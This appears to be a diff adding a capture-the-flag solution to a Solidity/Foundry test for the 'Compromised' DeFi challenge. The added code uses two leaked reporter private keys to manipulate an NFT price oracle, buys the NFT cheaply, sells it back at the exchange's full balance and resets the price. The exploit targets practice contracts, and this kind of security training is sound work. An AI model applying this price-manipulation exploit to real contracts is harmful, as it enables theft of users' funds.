@@ -75,7 +75,52 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Leaked private keys
+        address reporter1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address reporter2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        string memory SYMBOL = "DVNFT";
+
+        // Step 1: Set price to PLAYER_INITIAL_ETH_BALANCE ether using 2 out of 3 reporters
+        vm.startPrank(reporter1);
+        oracle.postPrice(SYMBOL, PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(reporter2);
+        oracle.postPrice(SYMBOL, PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Step 2: Buy the NFT at PLAYER_INITIAL_ETH_BALANCE ether
+        vm.startPrank(player);
+        uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+
+        // Step 3: Set price to exchange balance to sell it at high price
+        uint256 exchangeBalance = address(exchange).balance;
+
+        vm.startPrank(reporter1);
+        oracle.postPrice(SYMBOL, exchangeBalance);
+        vm.stopPrank();
+
+        vm.startPrank(reporter2);
+        oracle.postPrice(SYMBOL, exchangeBalance);
+        vm.stopPrank();
+
+        // Step 4: Approve and sell the NFT
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Step 5: Reset the price to initial value
+        vm.startPrank(reporter1);
+        oracle.postPrice(SYMBOL, INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(reporter2);
+        oracle.postPrice(SYMBOL, INITIAL_NFT_PRICE);
+        vm.stopPrank();
     }
 
     /**
